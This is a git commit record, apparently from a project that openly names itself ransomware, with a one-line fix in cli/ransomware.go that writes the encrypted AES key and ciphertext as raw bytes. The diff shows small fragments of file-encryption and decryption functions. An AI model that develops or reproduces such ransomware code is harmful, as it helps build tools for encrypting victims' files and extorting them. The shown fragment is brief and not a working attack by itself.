930bfdb5282cb3d09e2d30cf8405917b10f0c850
Marco Moschettini <m.marmos@gmail.com>
2026-03-13 11:25:37 +0100

    fix(cli): use WriteToFile for binary ciphertext output
    WriteStringToFile unnecessarily converts binary data through string,
    use WriteToFile which accepts []byte directly.

--- cli/ransomware.go
+++ cli/ransomware.go
@@ -283,7 +283,7 @@ func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encS
 
 	fileContent := append(encryptedAesKey, cipherText...)
 
-	return fs.WriteStringToFile(newFilePath, string(fileContent))
+	return fs.WriteToFile(newFilePath, fileContent)
 }
 
 func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) error {
